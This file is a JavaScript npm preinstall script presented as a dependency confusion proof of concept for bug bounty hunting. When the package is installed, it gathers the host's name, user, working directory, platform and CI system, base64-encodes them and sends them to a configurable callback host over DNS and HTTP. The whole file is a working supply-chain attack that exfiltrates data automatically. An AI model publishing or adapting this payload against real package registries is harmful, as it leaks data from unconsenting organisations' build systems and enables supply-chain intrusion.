/**
 * preinstall.js — RASTTHACK Dependency Confusion PoC
 *
 * DETECTION-ONLY payload — DNS + HTTP callbacks, no destructive actions.
 *
 * SETUP:
 *   1. Replace CALLBACK_HOST with your interactsh or Burp Collaborator URL
 *   2. Replace YOUR_ALIAS with your bug bounty alias/handle
 *   3. npm publish
 */

const https  = require('https');
const http   = require('http');
const os     = require('os');
const dns    = require('dns');

// ─── CONFIGURE THESE ──────────────────────────────────────────────────────────
const CALLBACK_HOST = 'REPLACE-WITH-YOUR-INTERACTSH-URL.oast.fun';
const YOUR_ALIAS    = 'RASTTHACK';
// ─────────────────────────────────────────────────────────────────────────────

const info = {
  pkg:      process.env.npm_package_name || 'unknown',
  version:  process.env.npm_package_version || 'unknown',
  host:     os.hostname(),
  platform: os.platform(),
  arch:     os.arch(),
  user:     process.env.USER || process.env.USERNAME || 'unknown',
  cwd:      process.cwd(),
  node:     process.version,
  ci:       !!(
    process.env.CI            ||
    process.env.GITHUB_ACTIONS ||
    process.env.JENKINS_URL    ||
    process.env.GITLAB_CI      ||
    process.env.CIRCLECI       ||
    process.env.TRAVIS
  ),
  ci_name:  (
    process.env.GITHUB_ACTIONS ? 'github-actions' :
    process.env.JENKINS_URL    ? 'jenkins'        :
    process.env.GITLAB_CI      ? 'gitlab-ci'      :
    process.env.CIRCLECI       ? 'circleci'       :
    process.env.TRAVIS         ? 'travis'         : 'none'
  ),
  ts: Date.now()
};

const payload = Buffer.from(JSON.stringify(info)).toString('base64');

// DNS callback — encode hostname into subdomain
const sub = `npm-${info.host}-${YOUR_ALIAS}`
  .replace(/[^a-z0-9-]/gi, '-')
  .toLowerCase()
  .slice(0, 40);

dns.lookup(`${sub}.${CALLBACK_HOST}`, () => {});

// HTTP callback
const params = new URLSearchParams({
  src:  'npm',
  host: info.host,
  ci:   String(info.ci),
  data: payload
});

const target = `https://${CALLBACK_HOST}/?${params.toString()}`;

https.get(target, () => {}).on('error', () => {
  // fallback HTTP
  http.get(target.replace('https://', 'http://'), () => {}).on('error', () => {});
});

// Clearly identify this as a security research payload
console.log('');
console.log('[SECURITY RESEARCH] Dependency confusion detection payload');
console.log(`[SECURITY RESEARCH] Researcher: ${YOUR_ALIAS}`);
console.log('[SECURITY RESEARCH] This is a bug bounty detection-only payload.');
console.log('[SECURITY RESEARCH] No destructive actions were taken.');
console.log('[SECURITY RESEARCH] Please check your security inbox / bug bounty program.');
console.log('');
